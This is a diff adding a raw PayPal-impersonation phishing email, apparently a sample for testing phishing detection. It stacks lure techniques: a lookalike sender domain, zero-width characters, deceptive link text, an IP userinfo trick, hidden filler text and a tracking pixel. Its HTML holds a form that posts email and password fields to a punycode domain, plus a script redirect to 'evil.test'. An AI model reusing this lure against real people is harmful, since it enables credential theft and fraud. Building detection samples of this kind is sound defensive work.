@@ -1,0 +1,44 @@
+Return-Path: <noreply@secure-paypa1.com>
+Received: from mail.secure-paypa1.com (mail.secure-paypa1.com [185.220.101.4])
+	by mx.recipient.net (Postfix) with ESMTP id AA11BB22
+	for <victim@recipient.net>; Wed, 23 Sep 2026 08:00:04 +0000
+Authentication-Results: mx.recipient.net; spf=pass smtp.mailfrom=secure-paypa1.com;
+	dkim=pass header.d=secure-paypa1.com; dmarc=pass header.from=secure-paypa1.com
+From: =?utf-8?q?PayPal_Serv=E2=80=8Bice?= <service@secure-paypa1.com>
+To: victim@recipient.net
+Subject: =?utf-8?b?WW91ciBhY2NvdW50IGlzIGxpbWl0ZWQ=?=
+Date: Wed, 23 Sep 2026 08:00:00 +0000
+Message-ID: <abc123@secure-paypa1.com>
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="ALT"
+
+--ALT
+Content-Type: text/plain; charset=utf-8
+
+Your account is limited. Verify at https://bit.ly/3xYz9 today.
+
+--ALT
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: quoted-printable
+
+<html><head><title>PayPal</title><style>.x{color:red}</style>
+<base href=3D"http://198.51.100.23/">
+</head><body>
+<p>Dear customer, your Pay=E2=80=8BPal account is limited.</p>
+<p><a href=3D"http://login.paypal.com.account-verify.secure-paypa1.com/sign=
+in">https://www.paypal.com/signin</a></p>
+<p><a href=3D"http://paypal.com@185.220.101.4/login">Resolve now</a></p>
+<p><a href=3D"https://www.paypal.com/help">Help center</a></p>
+<div style=3D"display:none">lorem ipsum dolor sit amet newsletter unsubscr=
+ibe weather sports recipes garden travel music books movies friends family=
+ holiday</div>
+<form action=3D"https://xn--pypal-4ve.com/collect" method=3D"post">
+<input type=3D"email" name=3D"u"><input type=3D"password" name=3D"p">
+</form>
+<img src=3D"https://track.secure-paypa1.com/o.gif?id=3D42" width=3D"1" heig=
+ht=3D"1">
+<script>document.location=3D'http://evil.test'</script>
+<a href=3D"javascript:alert(1)" onclick=3D"steal()">Click</a>
+</body></html>
+
+--ALT--
